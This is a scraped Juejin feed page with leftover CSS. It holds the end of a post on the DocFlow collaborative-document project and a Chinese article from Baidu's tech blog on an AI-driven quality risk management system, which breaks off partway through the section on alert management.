hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>写了半年的协同文档终于有点像样了，目前新增数学公式、RAG、续写，划词评论，创建组织和 @ 人等功能。</p>
<h2 data-id="heading-0">项目链接</h2>
<ul>
<li><strong>项目地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.codecrack.cn%2F" target="_blank" title="https://www.codecrack.cn/" ref="nofollow noopener noreferrer">www.codecrack.cn/</a></li>
<li><strong>GitHub 地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxun082%2FDocFlow" target="_blank" title="https://github.com/xun082/DocFlow" ref="nofollow noopener noreferrer">github.com/xun082/DocF…</a></li>
<li>联系微信：<code>yunmz777</code></li>
</ul>
<h2 data-id="heading-1">新功能预览</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e34b25d26e94d76a75fb4b8ffb5eaeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=JMdbht4pAUcyzbNAywN5kv3juI8%3D" alt="微信图片_20251203164800_7_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/613a493f64094f3f931972297dbaf44b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=oHLkaTmJHHRSZBBxHWH9kFFHjWo%3D" alt="微信图片_20251203164911_8_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d00762660bb143cf95c6b99dd25316fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=kWmUKEKFAco%2B6IiyOiFzQEXPXoE%3D" alt="微信图片_20251203164924_9_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c76aa7c27774844b421bc0ae4e30ef4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=UpHxBWqheqilXgZN6JuOmdmAJKQ%3D" alt="微信图片_20251203165229_10_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7d4f42e4b044586b42fdaec8c536621~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=Sk2SqCnegAMC1g591QPU%2Fg0gJoI%3D" alt="微信图片_20251203165403_11_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/537e62ded9d44d61bb93b0b5c49510b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=Kw9k9cIcRPlhL040%2BgLsxtnyvuM%3D" alt="微信图片_20251203165442_12_66.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d5298a269af4b99ac759430bb9b3b8f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443355&amp;x-signature=t4jwq7zOdcUEJK1VEHrURb69Uog%3D" alt="微信图片_20251203165502_13_66.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于AI的质量风险管控]]></title>    <link>https://juejin.cn/post/7579832417747419187</link>    <guid>https://juejin.cn/post/7579832417747419187</guid>    <pubDate>2025-12-04T08:56:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579832417747419187" data-draft-id="7579800429375750194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于AI的质量风险管控"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T08:56:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="百度Geek说"/> <meta itemprop="url" content="https://juejin.cn/user/4186596000416094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于AI的质量风险管控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4186596000416094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    百度Geek说
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:56:40.000Z" title="Thu Dec 04 2025 08:56:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">导读</h2>
<p>线上问题复盘发现质量保障存在测试召回、有效性及排查止损时效性不足等痛点，根源在于保障对象多样演进、线上问题处置复杂。为此我们构建质量风险管控系统，本文分别从风险管理系统的构建思想&amp;实践、风险感知系统的AI效果提升、风险控制系统的智能化建设等维度展开介绍，整体风险管控系统在构建过程效果、使用效果和质量结果等层面均取得较好效果。未来，AI将更深度参与质量风险管控过程，与人工协同构建更智能化的风险管控体系。</p>
<h2 data-id="heading-1">01 背景</h2>
<p>在线上问题的复盘中，我们总结出<strong><strong>质量保障的三大痛点</strong></strong>：</p>
<p><strong><strong>（1）问题测试召回/感知能力的完备性不足</strong></strong>：测试能力缺失导致问题漏检、监控报警缺失导致问题发现滞后；</p>
<p><strong><strong>（2）问题测试召回/感知能力的有效性不足</strong></strong>：测试工具不稳定导致测试结果失真、报警配置不合理导致误报/漏报；</p>
<p><strong><strong>（3）问题排查与止损的时效性不足</strong></strong>：线上问题定位能力缺失、定位止损慢、止损链路长，导致影响范围扩大。</p>
<p>究其根本，源于以下挑战：</p>
<p><strong><strong>（1）质量保障对象多样、海量且持续演进</strong></strong>：我们面对数以万计至百万级的质量保障对象（如服务模块、词表、业务对象等），每类对象对应不同的质量风险与保障策略。同时，这些对象本身还在不断变化，要求质量保障方案具备动态适应能力——即实现对质量保障对象的完整、动态、高效识别与控制，确保在合适的阶段选用最优的质量保障策略组合，以召回潜在风险。</p>
<p><strong><strong>（2）线上问题处置复杂、动态且高度关联</strong></strong>：线上系统面临大量动态风险（如变更、数据波动、流量与资源变动等），这些因素持续冲击系统稳定性。因此，我们亟需构建不依赖人、完备且高效的问题感知机制，并打造体系化、智能化的定位与止损能力，从而快速分析线索、实施干预，降低线上问题带来的损失。</p>
<p>为应对上述挑战，我们构建了<strong><strong>质量风险管控系统（RMCS）</strong></strong>，该系统由三部分组成：<strong>风险管理系统</strong>（RMS-Risk Manage System）-前置消除风险、<strong>风险感知系统</strong>（ROS-Risk Observe System）-中期发现问题、<strong>风险控制系统</strong>（RCS-Risk Control System）-后置控制损失。</p>
<h2 data-id="heading-2">02 AI的质量风险管控方案</h2>
<p>经过多年发展，伴随着AI的发展强大，质量风险管控经过起步阶段、发展阶段的建设积累，已经发展到关键的转型阶段：基于AI的质量风险管控阶段，我们普遍并深入的使用AI能力来解决质量风险管理全流程的问题，提升质量管控的效果和ROI。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7572bbf4300d40d6be417fda2f611d13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=KVtWdzoiE%2BJMfLcJw8qcnbCqCtQ%3D" alt="图片" loading="lazy"/></p>
<p><strong><strong>△ 基于AI的质量风险管控整体架构</strong></strong></p>
<p><strong><strong>领域知识</strong></strong>：把丰富的知识从各类入口、平台、配置以及人脑转移到标准的软件知识图谱中，以结构化知识和非结构化规范知识进行组织，按需转化为实体和关系，从而构建RMCS的丰富、标准、开放的知识图谱生态，实现海量信息的标准化、共享化存储。</p>
<p><strong><strong>RMCS核心能力</strong></strong></p>
<ul>
<li>
<p><strong><strong>RMS Agent （AI风险管理）</strong></strong>：以 AI 为核心，打造具备 “感知 - 决策 - 执行 - 反思” 能力的智能质量风险管理系统，实现 “<strong><strong>应拦尽拦</strong></strong>”。RMS以开放策略生态思路，灵活管理 “对象<em>质量能力、质量能力</em>风险处置策略”，实现对不同刻画对象能力现状的刻画，驱动质量能力提升，最终通过风险管理应用平台，实现数据、策略、刻画、闭环等环节的统一产品管理。</p>
</li>
<li>
<p><strong><strong>ROS  Agent（AI报警管理）</strong></strong>：依托领域知识，打造风险实时观测与降噪能力，实现 “<strong><strong>应报尽报</strong></strong>”。ROS涵盖知识建设、监控创建、维护、评估、降噪及报警跟进等多个环节，覆盖风险管理（如前置监控完备性建设）与控制（如报警有效性、感知后跟进处置）两个阶段，是问题发现后的主要感知手段。</p>
</li>
<li>
<p><strong><strong>RCS  Agent（AI值班人）</strong></strong>：融合领域模型与领域知识，打造端到端 AI 值班人，具备自主 / 协同式的智能定位与处置能力，实现 “<strong><strong>应快尽快</strong></strong>”。RCS围绕问题发生到止损全环节，构建报警分类导诊、排查定位、止损等多个环节的智能化控制能力，实现对问题整体损失预期控制，托管全流程风险控制过程。</p>
</li>
</ul>
<h2 data-id="heading-3">03 基于AI的质量风险管控核心能力介绍</h2>
<h3 data-id="heading-4"><strong>3.1 RMS Agent （AI做风险管理）</strong></h3>
<p>传统质量建设过程的核心痛点包括质量能力缺失、质量能力退化等反复出现的问题，面对庞大且持续变化的质量主题和持续发展的质量保障能力，需要构建不依赖于人刻画和前置风险识别，风险管理系统RMS就是为了解决这种前置风险而产生的， RMS以<strong><strong>知识图谱为基础，对质量保障『主体』上全生命周期『质量保障能力』进行持续的合理性风险评估、分发和处理流程管理</strong></strong>，牵引『主体』的『质量保障能力』持续发挥预期价值，达到将风险约束在适宜位置/阶段的目的，最终实现3个根本性转变：</p>
<ul>
<li>
<p><strong><strong>从“人治”到“数治”</strong></strong>： 将风险管控从依赖专家个人经验和重复劳动的模式，转变为基于全域数据和AI模型进行系统性、自动化治理的模式。</p>
</li>
<li>
<p><strong><strong>从“孤立”到“协同”</strong></strong>： 打破各业务线、各质量阶段之间的信息壁垒，通过统一的风险语言和协作流程，实现跨域风险的联动防控。</p>
</li>
<li>
<p><strong><strong>从“被动响应”到“主动预防”</strong></strong>： 从事后补救的“救火队”模式，转向事中干预、事前预测的“预警机”模式，将风险尽可能约束在萌芽或早期阶段。</p>
</li>
</ul>
<p>RMS核心关注的四大核心痛点和解决思路：</p>
<p><strong><strong>（1）“经验壁垒”与“人力瓶颈”问题</strong></strong>： 风险识别、评估、决策高度依赖少数专家的个人经验，难以规模化、标准化和传承，RMS 将专家经验沉淀为可计算、可复用的知识图谱和AI策略模型，让系统具备“专家级”的风险认知和判断能力。</p>
<p><strong><strong>（2）“信息孤岛”与“认知局限”问题</strong></strong>：业务系统、质量数据、保障能力等信息分散在不同部门，缺乏全局视角，RMS 通过构建覆盖“主体-对象-能力”的完备知识图谱，打通数据孤岛，形成统一的、相互关联的风险全景视图。。</p>
<p><strong><strong>（3）“响应滞后”与“漏反复”问题</strong></strong>： 传统人工巡检和评审方式，风险发现不及时，处理周期长且可能陷入“发现问题-修复-再次发生”的恶性循环，RMS实现7x24小时的自动化风险扫描与监测，并通过策略闭环确保风险被有效分发和处理，防止复发。</p>
<p><strong><strong>（4）“成本高昂”与“灵活性不足”问题</strong></strong>： 为每个业务线定制化搭建风控体系成本高、周期长，业务变化时，风控策略难以快速调整，无法适应敏捷开发和快速迭代的需求，RMS 通过中台化、组件化（拼装、插拔式）的架构，提供通用能力的同时，允许业务方低成本、高效率地自定义风控流程和策略，实现“开箱即用”与“灵活定制”的平衡。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb8c58752a4448e9a17f51377951bea1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=eSPLyRqZYS%2FB0nYsS9TKd8rKKvA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48a8cfa87fe54123975bf85f849b5cd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=7Q%2B8469I6m6GpFCIvCRN8dsuhcw%3D" alt="" loading="lazy"/></p>
<p>RMS旨在从<strong><strong>模式上</strong></strong>、<strong><strong>成本上</strong></strong>、<strong><strong>效果上</strong></strong>重塑质量风险管理过程，****打破业务间壁垒，最大化降低业务质量经营成本。****整体方案依托软件知识图谱，以一站式质量经营为导向，构建包括实体对象管理、质量能力管理、风险策略管理、风险观测、风险分发处置等通用能力。标准能力支持业务自主拼装、插拔式使用，实现风险从认知到闭环的全流程管理。支持各种质量角色的参与，协同以达到持续提升质量经营水平的目的。</p>
<p>下面是RMS提供的部分核心能力展示，目前RMS接入实体106万，覆盖实体类型115类，建设能力项394个，累计发现风险16万+，并完成了91.46%的风险闭环，直接支撑业务风险前置挖掘召回和闭环。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbb8084779dc453b86248fae84698368~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=Peaw%2BhOjCGMQCKA0hVXM%2BgE81Xo%3D" alt="image.png" loading="lazy"/>
基于多实体关系的大事件运营</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1272028dfdd842d48be11c9b4f542bc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m-5bqmR2Vla-ivtA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765443400&amp;x-signature=3iD%2FosIeyjVNA%2BlcUwDNgLTHby0%3D" alt="image.png" loading="lazy"/></p>
<p>风险智能闭环工作台</p>
<h3 data-id="heading-5"><strong>3.2 ROS  Agent（AI做报警管理）</strong></h3>
<p><strong><strong>监控报警建设核心要解决报警完备性、有效性</strong></strong>两个问题，即一旦异常发生时，需覆盖全位置、全指标异常并有效感知，同时对异常引发的多维、重复、关联报警进行降噪，减少报警信号的流转干扰。</p>
